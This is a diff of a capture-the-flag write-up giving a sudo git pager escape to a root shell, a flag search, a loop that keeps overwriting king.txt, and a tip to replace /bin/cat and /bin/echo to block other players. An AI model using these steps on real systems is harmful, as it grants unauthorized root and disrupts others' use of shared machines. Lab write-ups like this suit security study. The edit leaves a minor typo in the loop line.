@@ -21,10 +21,14 @@ id_rsa.pub
 ### Priviledge Escalation 
 - From ashu user `sudo su skiddy` 
 - After become skidy then look at the permission using sudo with `sudo -l`
-- After that check on `https://gtfobins.github.io/` for sudo git 
+- After that check on `https://gtfobins.github.io/` for sudo git `sudo git -p help config`
 - Using `:!/bin/bash` we will get root priviledges
 - Congrat's you got the root ... and just find other flag.txt using `find / -name "*.txt" 2>/dev/null`
 
 ### Defending king.txt
-- using this loop to change king.txt if other user change it. `while [ 1 ]; do  echo "anesthetistabove" - /root/king.txt ; sleep 0.1; done &` it will loop every 0.1 second
+- using this loop to change king.txt if other user change it. 
+```bash
+while [ 1 ]; do  echo "anesthetistabove" > /root/king.txt ; sleep 0.1; done &second
+```
+it will loop every 0.1 
 - Change `/bin/cat` `/bin/echo` to become other file, so other user can not use it ;) 
